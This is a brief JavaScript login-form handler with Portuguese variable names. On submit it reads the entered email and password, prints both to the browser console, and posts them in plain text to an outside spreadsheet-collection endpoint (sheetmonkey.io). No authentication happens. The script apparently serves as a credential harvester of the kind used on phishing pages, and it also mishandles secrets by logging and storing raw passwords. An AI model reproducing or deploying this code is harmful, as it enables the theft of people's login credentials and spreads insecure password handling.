var monkey = (event) => {
    event.preventDefault();

    var em= document.getElementById('iemail')
    var sh= document.getElementById('isenha')
    em.style.border='solid 1px red'
    sh.style.border='solid 1px red'
    
    var email = em.value;
    var senha = sh.value;

    var letraE = String(email).length;
    var letraS = String(senha).length;

    if (letraE > 1 && letraS > 1) {
        console.log(email, senha);

        fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N', {
            method: 'post',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email, senha: senha })  // Corrigido aqui
        })
        .then(response => response.json())  // Tratar a resposta (opcional)
        .then(data => console.log(data))
        .catch(error => console.error('Erro:', error));
    }
}

document.querySelector('form').addEventListener('submit', monkey);
